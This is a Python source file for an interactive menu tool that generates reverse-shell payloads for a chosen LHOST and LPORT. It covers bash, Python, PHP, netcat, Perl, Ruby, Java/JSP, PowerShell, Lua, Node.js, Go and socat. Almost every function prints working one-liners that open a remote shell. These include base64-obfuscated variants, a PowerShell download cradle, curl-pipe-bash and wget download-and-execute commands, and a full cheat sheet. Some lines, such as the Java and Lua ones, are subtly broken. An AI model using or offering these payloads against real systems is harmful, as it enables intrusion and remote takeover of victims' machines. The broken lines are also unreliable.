# reverse shell generator - every language ever
import os, base64, urllib.parse
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    Prompt.ask("\n[dim]enter to continue[/dim]")

def get_lhost():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def bash_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Bash ---[/bold yellow]\n")
    console.print(f"  [cyan]bash -i >& /dev/tcp/{lhost}/{lport} 0>&1[/cyan]\n")
    
    console.print(f"[bold yellow]--- Bash (no /dev/tcp) ---[/bold yellow]\n")
    console.print(f'  [cyan]0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196[/cyan]\n')
    
    console.print(f"[bold yellow]--- Bash (encoded) ---[/bold yellow]\n")
    encoded = base64.b64encode(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()).decode()
    console.print(f"  [cyan]echo {encoded} | base64 -d | bash[/cyan]\n")
    
    console.print(f"[bold yellow]--- Bash UDP ---[/bold yellow]\n")
    console.print(f"  [cyan]bash -i >& /dev/udp/{lhost}/{lport} 0>&1[/cyan]\n")

def python_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Python 2 ---[/bold yellow]\n")
    console.print(f'  [cyan]python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'[/cyan]\n')
    
    console.print(f"[bold yellow]--- Python 3 ---[/bold yellow]\n")
    console.print(f'  [cyan]python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(["/bin/sh","-i"])\'[/cyan]\n')
    
    console.print(f"[bold yellow]--- Python (no subprocess) ---[/bold yellow]\n")
    py_code = f"""import socket,os,pty
s=socket.socket()
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")"""
    console.print(f"  [cyan]{py_code}[/cyan]\n")

def php_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- PHP exec ---[/bold yellow]\n")
    console.print(f'  [cyan]php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'[/cyan]\n')
    
    console.print(f"[bold yellow]--- PHP shell_exec ---[/bold yellow]\n")
    console.print(f'  [cyan]php -r \'$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'[/cyan]\n')
    
    console.print(f"[bold yellow]--- PHP passthru ---[/bold yellow]\n")
    php_code = f"""<?php $sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>"""
    console.print(f"  [cyan]{php_code}[/cyan]\n")
    
    console.print(f"[bold yellow]--- PHP (obfuscated) ---[/bold yellow]\n")
    obf = base64.b64encode(f'php -r "$s=fsockopen(\\"{lhost}\\",{lport});$p=proc_open(\\"/bin/sh -i\\",array(0=>$s,1=>$s,2=>$s),$pi);"'.encode()).decode()
    console.print(f'  [cyan]echo {obf} | base64 -d | bash[/cyan]\n')

def netcat_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Netcat (-e) ---[/bold yellow]\n")
    console.print(f"  [cyan]nc -e /bin/bash {lhost} {lport}[/cyan]\n")
    
    console.print(f"[bold yellow]--- Netcat (no -e, FIFO) ---[/bold yellow]\n")
    console.print(f"  [cyan]rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f[/cyan]\n")
    
    console.print(f"[bold yellow]--- Netcat (-c) ---[/bold yellow]\n")
    console.print(f"  [cyan]nc -c /bin/bash {lhost} {lport}[/cyan]\n")
    
    console.print(f"[bold yellow]--- Ncat ---[/bold yellow]\n")
    console.print(f"  [cyan]ncat {lhost} {lport} -e /bin/bash[/cyan]\n")
    console.print(f"  [cyan]ncat --ssl {lhost} {lport} -e /bin/bash[/cyan]\n")

def perl_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Perl ---[/bold yellow]\n")
    console.print(f'  [cyan]perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\'[/cyan]\n')
    
    console.print(f"[bold yellow]--- Perl (Windows) ---[/bold yellow]\n")
    console.print(f'  [cyan]perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'[/cyan]\n')

def ruby_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Ruby ---[/bold yellow]\n")
    console.print(f'  [cyan]ruby -rsocket -e \'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'[/cyan]\n')

def java_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Java Runtime ---[/bold yellow]\n")
    console.print(f'  [cyan]java -cp . -e Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}});[/cyan]\n')
    
    console.print(f"[bold yellow]--- JSP ---[/bold yellow]\n")
    jsp = f'<% Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}}); %>'
    console.print(f'  [cyan]{jsp}[/cyan]\n')

def powershell_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- PowerShell One-Liner ---[/bold yellow]\n")
    ps = f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($rb);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
    console.print(f'  [cyan]powershell -nop -c "{ps}"[/cyan]\n')
    
    console.print(f"[bold yellow]--- PowerShell (encoded) ---[/bold yellow]\n")
    encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
    console.print(f'  [cyan]powershell -nop -enc {encoded}[/cyan]\n')
    
    console.print(f"[bold yellow]--- PowerShell (download cradle) ---[/bold yellow]\n")
    console.print(f'  [cyan]powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{lhost}/shell.ps1\')"[/cyan]\n')

def lua_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    console.print("\n[bold yellow]--- Lua ---[/bold yellow]\n")
    cmd = 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'' + lhost + '\',\'' + lport + '\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"'
    console.print("  [cyan]" + cmd + "[/cyan]\n")

def nodejs_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Node.js ---[/bold yellow]\n")
    node_code = f'(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();'
    console.print(f'  [cyan]node -e "{node_code}"[/cyan]\n')

def go_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Go (compile this) ---[/bold yellow]\n")
    go_code = f"""package main
import ("net";"os";"os/exec")
func main(){{ c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run() }}"""
    console.print(f"  [cyan]{go_code}[/cyan]\n")

def socat_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Socat ---[/bold yellow]\n")
    console.print(f"  [cyan]socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane[/cyan]\n")
    console.print(f"[bold yellow]--- Socat (encrypted) ---[/bold yellow]\n")
    console.print(f"  [cyan]# generate cert first: openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt && cat shell.key shell.crt > shell.pem[/cyan]")
    console.print(f"  [cyan]socat OPENSSL:{lhost}:{lport},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane[/cyan]\n")
    console.print(f"[bold yellow]--- Socat listener ---[/bold yellow]\n")
    console.print(f"  [cyan]socat file:`tty`,raw,echo=0 tcp-listen:{lport},reuseaddr[/cyan]\n")

def wget_curl_reverse():
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold yellow]--- Wget (download + exec) ---[/bold yellow]\n")
    console.print(f"  [cyan]wget http://{lhost}/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh[/cyan]\n")
    
    console.print(f"[bold yellow]--- Curl (download + exec) ---[/bold yellow]\n")
    console.print(f"  [cyan]curl http://{lhost}/shell.sh | bash[/cyan]\n")
    
    console.print(f"[bold yellow]--- Wget (reverse shell binary) ---[/bold yellow]\n")
    console.print(f"  [cyan]wget http://{lhost}/nc -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash {lhost} {lport}[/cyan]\n")

def all_shells():
    """show all available shell types"""
    clr()
    console.print("[bold red]=== ALL REVERSE SHELLS ===[/bold red]\n")
    
    console.print("""[yellow]pick a category:[/yellow]

  [1] Bash
  [2] Python
  [3] PHP
  [4] Netcat / Ncat
  [5] Perl
  [6] Ruby
  [7] Java / JSP
  [8] PowerShell
  [9] Lua
  [10] Node.js
  [11] Go
  [12] Socat
  [13] Download + Exec (wget/curl)
  [14] One-liner cheat sheet (all)
""")

def shell_cheatsheet():
    """one page with all shells"""
    clr()
    lhost = Prompt.ask("[cyan]LHOST[/cyan]", default=get_lhost())
    lport = Prompt.ask("[cyan]LPORT[/cyan]", default="4444")
    
    console.print(f"\n[bold red]=== REVERSE SHELL CHEAT SHEET ({lhost}:{lport}) ===[/bold red]\n")
    
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Bash (FIFO)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Python 3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run([\"/bin/sh\",\"-i\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
        "Ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "NC (FIFO)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Ncat": f"ncat {lhost} {lport} -e /bin/bash",
        "Socat": f"socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
        "Lua": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "Node.js": f"node -e '(function(){{var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect({lport},\"{lhost}\",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();'",
    }
    
    for name, shell in shells.items():
        console.print(f"[bold yellow]{name}:[/bold yellow]")
        console.print(f"  [cyan]{shell}[/cyan]\n")
    
    # windows
    console.print(f"[bold yellow]Windows PowerShell:[/bold yellow]")
    ps = f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';([text.encoding]::ASCII).GetBytes($rb);$s.Flush()}};$c.Close()"
    console.print(f"  [cyan]powershell -nop -c \"{ps}\"[/cyan]\n")
    
    pause()


def run():
    while True:
        clr()
        console.print("[bold red]=== REVERSE SHELL GENERATOR ===[/bold red]\n")
        from rich.table import Table
        t = Table(show_header=False, box=box.ROUNDED, border_style="red", padding=(0, 2))
        t.add_column("", style="bold yellow", width=4)
        t.add_column("")
        opts = [
            "Bash Reverse Shells",
            "Python Reverse Shells",
            "PHP Reverse Shells",
            "Netcat / Ncat Shells",
            "Perl Reverse Shells",
            "Ruby Reverse Shell",
            "Java / JSP Shells",
            "PowerShell Reverse Shells",
            "Lua Reverse Shell",
            "Node.js Reverse Shell",
            "Go Reverse Shell",
            "Socat Reverse Shells",
            "Download + Exec Shells",
            "Full Cheat Sheet (all at once)",
        ]
        for i, o in enumerate(opts, 1):
            t.add_row(str(i), o)
        t.add_row("", "")
        t.add_row("b", "Back")
        console.print(Panel(t, title="[bold]REVERSE SHELLS[/bold]", border_style="red"))
        
        try:
            c = int(Prompt.ask("[bold yellow]>[/bold yellow]"))
        except ValueError:
            c = 0
        
        if c == 1: bash_reverse()
        elif c == 2: python_reverse()
        elif c == 3: php_reverse()
        elif c == 4: netcat_reverse()
        elif c == 5: perl_reverse()
        elif c == 6: ruby_reverse()
        elif c == 7: java_reverse()
        elif c == 8: powershell_reverse()
        elif c == 9: lua_reverse()
        elif c == 10: nodejs_reverse()
        elif c == 11: go_reverse()
        elif c == 12: socat_reverse()
        elif c == 13: wget_curl_reverse()
        elif c == 14: shell_cheatsheet()
        elif c == 0: return
        
        pause()
